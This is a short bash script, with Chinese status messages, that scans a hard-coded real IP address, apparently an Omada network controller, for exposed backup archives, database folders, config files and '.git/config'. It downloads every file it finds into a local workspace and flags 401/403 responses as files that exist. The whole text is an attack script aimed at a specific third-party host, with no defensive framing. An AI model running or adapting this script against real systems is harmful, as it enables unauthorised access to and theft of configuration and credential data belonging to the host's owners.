#!/bin/bash

TARGET="https://135.125.237.250:8043"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 尝试备份文件泄露"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

BACKUP_PATHS=(
    "/backup/backup.tar.gz"
    "/backup/config.tar.gz"
    "/data/backup.tar.gz"
    "/data/autobackup/latest.tar.gz"
    "/autobackup/backup.tar.gz"
    "/download/backup.tar.gz"
    "/omada_backup.tar.gz"
    "/config_backup.tar.gz"
    "/controller_backup.tar.gz"
    "/backup/"
    "/data/backup/"
    "/autobackup/"
    "/data/db/"
    "/data/"
    "/.git/config"
    "/config.json"
    "/config.yml"
)

for path in "${BACKUP_PATHS[@]}"; do
    echo -n "[*] 测试: $path ... "
    
    response=$(curl -sk "${TARGET}${path}" -w "\n%{http_code}" -o /tmp/test_backup 2>/dev/null)
    http_code=$(echo "$response" | tail -1)
    
    if [ "$http_code" == "200" ]; then
        size=$(stat -c%s /tmp/test_backup 2>/dev/null)
        if [ "$size" -gt 100 ]; then
            echo "✅ 成功！大小: $size bytes"
            cp /tmp/test_backup "/workspace/backup_$(echo $path | tr '/' '_').file"
            echo "    保存到: backup_$(echo $path | tr '/' '_').file"
        else
            echo "❌ 文件太小 ($size bytes)"
        fi
    elif [ "$http_code" == "403" ]; then
        echo "⚠️  403 Forbidden（文件存在但无权限）"
    elif [ "$http_code" == "401" ]; then
        echo "⚠️  401 Unauthorized（需要认证）"
    else
        echo "❌ $http_code"
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
